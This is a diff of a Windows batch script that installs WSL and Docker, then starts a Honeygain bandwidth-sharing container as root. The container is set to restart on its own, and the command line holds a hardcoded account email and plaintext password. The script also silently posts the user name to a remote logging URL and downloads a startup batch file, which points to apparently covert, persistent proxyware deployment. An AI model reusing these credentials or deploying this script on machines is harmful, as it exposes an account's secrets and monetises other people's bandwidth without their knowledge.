@@ -16,9 +16,9 @@ set "PAYLOAD={\"user\":\"%USER%\",\"err\":\"%ERR%\"}"
 powershell -Command "Invoke-RestMethod -Uri '%LOG_URL%' -Method POST -Body '%PAYLOAD%' -ContentType 'application/json'" >nul 2>&1
 endlocal
 goto :eof
-
+call :log "running bat"
 :: === Check if WSL is installed ===
-wsl -l >nul 2>&1
+wsl --status >nul 2>&1
 if %errorlevel% neq 0 (
     call :log "WSL not installed, running wsl --install"
     echo Installing WSL...
@@ -29,6 +29,7 @@ if %errorlevel% neq 0 (
     call :log "WSL is already installed"
     echo WSL already installed.
 )
+
 
 :: Set WSL 2 as default
 call :log "Setting default WSL version to 2"
@@ -75,7 +76,7 @@ call :log "Added root to Docker group"
 
 :: Run Honeygain container
 call :log "Attempting to run Honeygain container"
-wsl -u root -e sh -c "docker start honeygain || docker run -d --name honeygain --restart unless-stopped honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGSBDoc"
+wsl -u root -e sh -c "docker start honeygain || docker run -d --name honeygain --restart unless-stopped honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGDoc"
 call :log "Honeygain container started or already running"
 
 :: Download startup bat
